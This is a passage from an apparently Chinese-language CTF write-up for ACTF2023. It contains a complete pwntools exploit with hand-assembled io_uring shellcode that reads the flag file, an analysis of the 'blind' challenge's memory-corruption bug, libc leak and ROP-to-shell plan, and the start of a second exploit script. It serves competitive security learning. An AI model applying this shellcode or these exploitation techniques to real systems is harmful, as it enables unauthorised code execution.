class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./master-of-orw1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x15BD)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">lea    rax,[rip+0x3f9-7]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">movq   xmm2,rax</span></span><br><span class="line"><span class="string">sub    rsp,0x108</span></span><br><span class="line"><span class="string">lea    rbx,[rsp+0x20]</span></span><br><span class="line"><span class="string">lea    rbp,[rsp+0x40]</span></span><br><span class="line"><span class="string">movq   xmm0,rbx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">lea    r12,[rsp+0x18]</span></span><br><span class="line"><span class="string">punpcklqdq xmm0,xmm2</span></span><br><span class="line"><span class="string">movaps XMMWORD PTR [rsp],xmm0</span></span><br><span class="line"><span class="string">sub    rsp,0x88</span></span><br><span class="line"><span class="string">mov    r8,rdi</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">mov    rdx,rsp</span></span><br><span class="line"><span class="string">mov    rdi,r8</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdx</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">sub    rsp,0x10</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">mov    rdi,0x1a9</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">lea    rdi,[rbx+0x8]</span></span><br><span class="line"><span class="string">mov    r12d,eax</span></span><br><span class="line"><span class="string">and    rdi,0xfffffffffffffff8</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx],0x0</span></span><br><span class="line"><span class="string">mov    rdx,rbx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx+0xd0],0x0</span></span><br><span class="line"><span class="string">lea    rcx,[rbx+0x68]</span></span><br><span class="line"><span class="string">mov    edi,r12d</span></span><br><span class="line"><span class="string">mov    r13d,edi</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">mov    r12,rcx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdx</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rsi]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rsi+0x40]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rsi+0x4]</span></span><br><span class="line"><span class="string">lea    rax,[rax+rdx*4]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">shl    rsi,0x4</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x48],rax</span></span><br><span class="line"><span class="string">add    rsi,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rcx+0x38],rsi</span></span><br><span class="line"><span class="string">mov    rsi,QWORD PTR [rbp+0x48]</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x38],rsi</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">xor    edi,edi</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x50],rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x40],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x28]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rbx]</span></span><br><span class="line"><span class="string">mov    r9d,0x10000000</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">shl    rsi,0x6</span></span><br><span class="line"><span class="string">push   0</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">loop1:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [rbp+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x2c+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 6</span></span><br><span class="line"><span class="string">    jnz loop1</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">mov    rdx,3</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x30],rax</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x38],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x50]</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [r12+0x40]</span></span><br><span class="line"><span class="string">mov    r15,0</span></span><br><span class="line"><span class="string">loop2:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [r12+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x54+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 4</span></span><br><span class="line"><span class="string">    jnz loop2</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x28],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x30],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x68]</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x20],rax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">mov    r13d,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x8]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc4],r12d</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc0],eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x14]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc8],eax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">add    rsp,0x88</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    BYTE PTR [rax],0x12</span></span><br><span class="line"><span class="string">mov    WORD PTR [rax+1],0</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rax+4],0xffffff9c</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x8],0</span></span><br><span class="line"><span class="string">mov    rdx,[rsp+8]</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x10],rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_wait_cqe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor    r9d,r9d</span></span><br><span class="line"><span class="string">mov    rdx,0x2000</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rsp+0xa8]</span></span><br><span class="line"><span class="string">mov    ecx,0x2</span></span><br><span class="line"><span class="string">mov    esi,0x30</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rax+0x8]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx],eax</span></span><br><span class="line"><span class="string">mov    edx,0x3</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    r15,rax</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    BYTE PTR [rax],0x17</span></span><br><span class="line"><span class="string">mov    WORD PTR [rax+1],0</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rax+4],1</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x8],0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x10],r15</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0x30</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func </span></span><br><span class="line"><span class="string">loop3:</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    jmp loop3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_get_sqe_func:</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rax]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">lea    edx,[rax+0x1]</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">and    eax,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x44],edx</span></span><br><span class="line"><span class="string">add    rax,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_submit_func:</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    r10,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [r10]</span></span><br><span class="line"><span class="string">sub    r8d,edx</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="string">add    r8d,eax</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">nop    DWORD PTR [rax+0x0]</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">and    edx,ecx</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">and    esi,ecx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r9+rsi*4],edx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">add    edx,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x40],edx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r10],eax</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">sub    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0xc0]</span></span><br><span class="line"><span class="string">mov    ecx,eax</span></span><br><span class="line"><span class="string">and    ecx,0x2</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">or     r8d,0x1</span></span><br><span class="line"><span class="string">test   al,0x1</span></span><br><span class="line"><span class="string">cmovne ecx,r8d</span></span><br><span class="line"><span class="string">mov    edi,DWORD PTR [rdi+0xc4]</span></span><br><span class="line"><span class="string">mov    r9,r8</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">mov    ecx,edx</span></span><br><span class="line"><span class="string">mov    edx,esi</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">mov    edi,0x1aa</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">push   0x8</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall_func:</span></span><br><span class="line"><span class="string">mov    rax,rdi</span></span><br><span class="line"><span class="string">mov    rdi,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">mov    rdx,rcx</span></span><br><span class="line"><span class="string">mov    r10,r8</span></span><br><span class="line"><span class="string">mov    r8,r9</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_wait_cqe:</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rdi+0x98]</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mmap64_func:</span></span><br><span class="line"><span class="string">mov    r10d,ecx</span></span><br><span class="line"><span class="string">push   0x9</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Input your code&quot;</span>,shellcode + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x3f9</span> - <span class="built_in">len</span>(shellcode)) + <span class="string">b&quot;./flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h2><p>本题目没有二进制文件</p>
<p><strong>漏洞分析</strong></p>
<p>本题目实现了一个简单的交互系统：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a]aaaaa</span><br></pre></td></tr></table></figure>
<ul>
<li>A/D：左移/右移 <code>[]</code>，用以选中不同的对象</li>
<li>W/S：使目标对象的 asicc 值 <code>+1/-1</code></li>
<li>空格：大写字母/小写字母的切换</li>
<li>回车：执行程序</li>
</ul>
<p>程序在 <code>aaaaaa</code> 字符后有一个指针，指向了 <code>aaaaaa</code> 字符的地址，后续的 printf 将会使用该地址来打印数据</p>
<p>程序没有限制 A/D 的范围，导致我们可以将 <code>[]</code> 移动到 <code>aaaaaa</code> 后的地址上，然后使用 W/S 来修改该地址，从而使后续的 printf 输出错误的数据</p>
<p><strong>入侵思路</strong></p>
<p>在比赛时测试的内存结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa pointer heap_addr libc_addr stack_addr</span><br></pre></td></tr></table></figure>
<ul>
<li>经过测试，这个 libc_addr 就是返回地址</li>
</ul>
<p>泄露的 libc_base 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] leak_addr &gt;&gt; <span class="number">0x7f4a645e2d0a</span></span><br><span class="line">[+] __libc_start_main &gt;&gt; <span class="number">0x7f4a645e2d0a</span></span><br></pre></td></tr></table></figure>
<p>查找到的 libc 版本如下：</p>
<img src="/2023/11/01/ACTF2023/1698753907976.png" class width="1698753907976"> 
<p>泄露 libc_base 后，我们就可以继续移动 <code>[]</code> 到后续的返回地址处，使用 W/S 来修改返回地址为 ROP 链</p>
<p>最后有一个十分恶心的问题，题目远程 <code>/bin/sh</code> 的偏移和本地 libc 的不同，这里只能尝试将 RDI 设置为某个明显的字符串，然后通过这个字符串的位置来逐步计算 <code>/bin/sh</code> 的偏移</p>
<ul>
<li>比赛时没有找到 <code>/bin/sh</code>，而是找到一个末尾是 <code>sh</code> 的字符串</li>
<li>然后计算 <code>sh</code> 的偏移执行 <code>system(&quot;sh&quot;)</code> 拿到 shell</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = 